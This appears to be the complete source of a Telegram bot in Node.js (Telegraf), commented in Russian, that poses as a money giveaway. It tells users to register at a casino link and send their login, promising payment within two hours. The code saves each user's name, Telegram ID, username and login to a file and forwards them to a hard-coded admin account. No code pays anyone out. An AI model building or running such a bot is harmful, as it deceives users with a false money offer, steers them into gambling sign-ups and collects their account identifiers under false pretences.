const { Telegraf, Markup } = require("telegraf");
const fs = require("fs");
require("dotenv").config();

const bot = new Telegraf(process.env.BOT_TOKEN);

// 🔑 Впиши свой Telegram ID сюда:
const ADMIN_ID = 1704458173; // замени на свой ID

// Файл для логинов
const DATA_FILE = "logins.json";

// Загружаем сохранённые логины
let logins = {};
if (fs.existsSync(DATA_FILE)) {
  logins = JSON.parse(fs.readFileSync(DATA_FILE));
}

// Сохраняем логины в файл
function saveLogins() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(logins, null, 2));
}

// Приветственное сообщение
bot.start(async (ctx) => {
  await ctx.replyWithPhoto(
    { source: "https://i.postimg.cc/Gh8DLWZ5/assets-task-01k4pkk5xpe88vt7gj3y6fjg7y-1757400501-img-0-1.jpg" }, // локальное фото
    {
      caption: "Привет! Этот бот для раздачи денег 💸.\nЧтобы продолжить, нажми кнопку ниже:",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("Получить деньги 💵", "get_money")],
      ]),
    }
  );
});

// Обработка кнопки "Получить деньги"
bot.action("get_money", async (ctx) => {
  await ctx.replyWithPhoto(
    { source: "https://i.postimg.cc/wxbJdqbN/20250909-0107-remix-01k4nnt8knfgdap45g3kc78cxx-1.jpg" }, // второе фото
    {
      caption:
        "Чтобы получить деньги, тебе нужно зарегистрироваться по ссылке:\nhttps://t.me/casinobetlink/10\n\nи прислать свой логин. В течение 2 часов деньги придут на аккаунт по логину.",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("📩 Прислать логин", "send_login")],
      ]),
    }
  );
});

// Обработка кнопки "Прислать логин"
bot.action("send_login", async (ctx) => {
  await ctx.reply("Напиши сюда свой логин 👇");
});

// Обработка текстовых сообщений (логинов)
bot.on("text", async (ctx) => {
  const userId = String(ctx.from.id);
  const message = ctx.message.text.trim();

  if (logins[userId]) {
    return ctx.reply("❌ Вы уже отправили логин. Второй раз нельзя.");
  }

  logins[userId] = {
    telegramName: `${ctx.from.first_name || ""} ${ctx.from.last_name || ""}`.trim(),
    telegramID: userId,
    username: ctx.from.username || "",
    login: message,
  };
  saveLogins();

  // ✅ Отправка пользователю
  await ctx.reply(`✅ Логин "${message}" сохранён!`);

  // 📩 Отправка админу в ЛС
  await bot.telegram.sendMessage(
    ADMIN_ID,
    `📥 Новый логин!\n👤 Пользователь: ${ctx.from.first_name} (@${ctx.from.username || "нет"})\n🆔 ID: ${userId}\n🔑 Логин: ${message}`
  );
});

// Запуск
bot.launch();
console.log("🤖 Бот запущен");
